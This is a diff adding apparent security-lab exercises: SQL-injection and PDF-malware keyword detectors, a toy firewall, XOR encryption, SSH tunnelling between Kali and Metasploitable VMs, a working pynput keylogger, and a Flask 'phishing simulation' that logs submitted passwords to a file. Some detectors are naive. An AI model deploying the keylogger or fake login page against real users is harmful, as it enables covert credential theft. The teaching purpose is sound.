@@ -1,0 +1,197 @@
+1.SQL injection
+import re
+
+def check_sql_injection(input_string):
+    sql_injection_patterns = [r"(['\";=(){}|&^])", r"(--|\s+OR\s+|UNION\s+ALL\s+SELECT)", r"(\bSELECT\b|\bDROP\b|\bUPDATE\b)"]
+    
+    # Check for any SQL Injection patterns using regular expressions
+    for pattern in sql_injection_patterns:
+        if re.search(pattern, input_string, re.IGNORECASE):
+            return f"Potential SQL Injection detected. Please sanitize inputs."
+
+    return "No SQL Injection detected."
+
+input_string = input("Enter a string to check for SQL injection: ")
+result = check_sql_injection(input_string)
+print(result)
+
+2.PDF malware analysis 
+from pypdf import PdfReader
+
+def check_pdf_for_malware(pdf_path):
+    # Suspicious keywords associated with malware
+    suspicious_keywords = ['/js', '/JavaScript', '/AA', '/open_action']
+
+    try:
+        reader = PdfReader(pdf_path)
+        pdf_safe = True
+
+        for page_num, page in enumerate(reader.pages):
+            text = page.extract_text()
+            if text:
+                for keyword in suspicious_keywords:
+                    if keyword in text:
+                        print(f"Malicious PDF detected: Keyword '{keyword}' found on page {page_num + 1}")
+                        pdf_safe = False
+                        break
+            else:
+                print(f"Page {page_num + 1} has no extractable text.")
+
+        if pdf_safe:
+            print("The PDF is safe.")
+        else:
+            print("The PDF contains suspicious content.")
+    except Exception as e:
+        print(f"Error processing PDF: {e}")
+
+pdf_path = 'sample.pdf'
+check_pdf_for_malware(pdf_path)
+
+3.Simple Firewall
+def simple_firewall(packet):
+    trusted_ips = ["192.168.1.100"]
+    trusted_ports = [80, 443]  # HTTP and HTTPS
+    
+    if packet["src_ip"] in trusted_ips and packet["dst_port"] in trusted_ports:
+        return True
+    return False
+
+packets = [
+    {"src_ip": "192.168.1.100", "dst_ip": "192.168.1.200", "dst_port": 80},
+    {"src_ip": "192.168.1.101", "dst_ip": "192.168.1.200", "dst_port": 80},
+    {"src_ip": "192.168.1.100", "dst_ip": "192.168.1.200", "dst_port": 22},
+]
+
+for packet in packets:
+    if simple_firewall(packet):
+        print(f"Packet allowed: {packet}")
+    else:
+        print(f"Packet blocked: {packet}")
+
+4.Symmetric XOR encryption/decryption
+def xor_encrypt_decrypt(input_string, key):
+    input_bytes = bytearray(input_string, 'utf-8')
+    output_bytes = bytearray([byte ^ key for byte in input_bytes])
+    return output_bytes.decode('utf-8', 'ignore')
+
+key = 123  # XOR key (choose a proper key)
+original_text = input("Enter the message to encrypt: ")
+
+encrypted_text = xor_encrypt_decrypt(original_text, key)
+print(f"Encrypted: {encrypted_text}")
+
+decrypted_text = xor_encrypt_decrypt(encrypted_text, key)
+print(f"Decrypted: {decrypted_text}")
+
+5.Key logger
+/*import pynput
+from pynput.keyboard import Key,Listener
+log_file="keylog.txt"
+def on_press(key):
+    with open(log_file,"a")as f:
+        try:
+            f.write(key.char)
+        except AttributeError:
+            if key==Key.space:f.write(" ")
+            elif key==Key.enter:f.write("\n")
+            elif key==Key.tab:f.write("\t")
+            else:f.write(f"{key}")
+def on_release(key):
+    if key==Key.esc:return False
+listener=Listener(on_press=on_press,on_release=on_release)
+listener.start()/*
+6.Process listing new Linux user
+# Step 1: Create a new user
+sudo adduser username
+
+# Step 2: Login as the new user
+su - username
+
+# Step 3: Create a script to display all processes
+nano process_list.sh
+
+# Step 4: Write the following commands in the script
+#!/bin/bash
+ps aux
+
+# Step 5: Give execute permissions to the script
+chmod +x process_list.sh
+ls -l process_list.sh
+
+# Step 6: Execute the script
+./process_list.sh
+
+7.Phishing Simulation
+from flask import Flask, render_template_string, request
+import os
+
+app = Flask(__name__)
+
+LOGIN_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Page</title>
+</head>
+<body>
+    <h2>Login</h2>
+    <form method="POST" action="/login">
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username" required><br><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
+"""
+
+CREDENTIALS_FILE = "credentials.txt"
+
+@app.route('/')
+def home():
+    return render_template_string(LOGIN_PAGE)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    with open(CREDENTIALS_FILE, 'a') as f:
+        f.write(f"Username: {username}, Password: {password}\n")
+    return "<h2>Login successful!</h2>"
+
+if __name__ == '__main__':
+    if os.path.exists(CREDENTIALS_FILE):
+        os.remove(CREDENTIALS_FILE)
+    print("Starting the dummy login server. Open http://127.0.0.1:5000 in your browser.")
+    app.run(debug=True)
+
+8.SSH Tunneling
+Experiment 8 - SSH Tunnelling
+Set up 2 VMs and demonstrate SSH Tunnelling between them
+Prerequisites
+- Kali Linux Virtual Machine
+- Metasploitable Virtual Machine
+Step 1
+Launch both VMs and run the ifconfig command to get IPs of both devices.
+Step 2
+Ping VM1 and VM2 from each other using ping <IP> command from both VMs to confirm connectivity between both VMs.
+ 
+Step 3
+Install SSH and Python on both terminals using the following commands:
+sudo apt update
+sudo apt install openssh-client
+sudo apt install python3 or sudo apt-get install python3
+Step 4
+Start python server on Metasploitable VM (victim)
+python3 -m http.server 8080 or python -m SimpleHTTPServer 8080
+Step 5
+Use SSH to connect to victim VM from Kali VM (attacker)
+ssh -L 9090:localhost:8080 msfadmin@<Metasploitable_IP>
+If this does not work use the following command
+ssh -o HostkeyAlgorithms=+ssh-rsa -L 9090:localhost:8080 msfadmin@<Metasploitable_IP>
+ Step 6
+In Kali VM, Open the browser and search http://localhost:9090. You can see the content of Metasploitable VM
+
+
+
